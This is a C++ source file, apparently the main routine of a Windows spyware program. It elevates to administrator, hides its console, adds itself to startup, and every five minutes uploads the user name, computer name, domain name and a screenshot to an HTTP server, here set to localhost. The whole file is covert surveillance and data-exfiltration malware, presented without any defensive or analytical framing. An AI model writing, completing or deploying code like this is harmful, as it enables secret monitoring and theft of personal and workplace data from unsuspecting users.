#include <windows.h>
#include <wininet.h>
#include <Lmcons.h>
#include <lm.h>
#include <iostream>
#include <string>
#include <fstream>
#include <sstream>
#include <vector>
#include <gdiplus.h>

#include "header/UserDataUploader.h"
#include "header/FileManager.h"
#include "header/ScreenshotUploader.h"
#include "header/ScreenshotManager.h"
#include "header/SystemClientInfo.h"
#include "header/StartupManager.h"

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "Crypt32.lib")


int main() {
    // Check if running as admin
    if (!StartupManager::IsRunningAsAdmin()) {
        StartupManager::RunAsAdmin();
    }

    // Hide console
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    Sleep(300000); // wait 5 minutes until the computer starts working completely

    StartupManager::addToStartup();

    ScreenshotManager screenshotManager;
    HttpClient httpClient("localhost", 3000);
    if (!httpClient.init()) {
        std::cerr << "HTTP Client initialization failed" << std::endl;
        return 1;
    }

    ScreenshotUploader uploader(httpClient);
    UserDataUploader userDataUploader(httpClient);

    std::string computerName = SystemInfo::getComputerName();
    std::string userName = SystemInfo::getUserName();
    std::string domainName = SystemInfo::getDomainName();
    std::string filePath = userName + "-screenshot.png";

    while (true) {
        userDataUploader.uploadUserData(userName, computerName, domainName);
        screenshotManager.captureScreenshot(filePath);
        uploader.uploadScreenshot(filePath, userName);
        Sleep(300000); // waiting 5 minutes for subsequent sending 
    }

    return 0;
}
